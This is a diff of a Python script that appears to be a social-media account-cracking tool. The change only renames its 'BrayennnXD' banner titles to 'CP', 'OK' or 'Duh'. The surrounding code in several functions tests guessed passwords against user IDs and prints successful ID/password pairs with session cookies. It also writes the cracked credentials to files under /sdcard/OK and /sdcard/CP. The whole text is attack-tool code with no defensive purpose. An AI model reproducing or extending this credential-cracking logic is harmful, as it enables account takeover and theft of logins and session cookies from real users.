@@ -1576,7 +1576,7 @@ def kontol(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Duh')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1585,7 +1585,7 @@ def kontol(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='duh')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1598,7 +1598,7 @@ def kontol(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1608,7 +1608,7 @@ def kontol(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1665,7 +1665,7 @@ def bapi(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1674,7 +1674,7 @@ def bapi(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1697,7 +1697,7 @@ def bapi(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1735,7 +1735,7 @@ def colmek1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1744,7 +1744,7 @@ def colmek1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1757,7 +1757,7 @@ def colmek1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1767,7 +1767,7 @@ def colmek1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1805,7 +1805,7 @@ def validate1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1814,7 +1814,7 @@ def validate1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1827,7 +1827,7 @@ def validate1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1837,7 +1837,7 @@ def validate1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1893,7 +1893,7 @@ def reguler1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1902,7 +1902,7 @@ def reguler1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
 					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1915,7 +1915,7 @@ def reguler1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1925,7 +1925,7 @@ def reguler1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
 					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
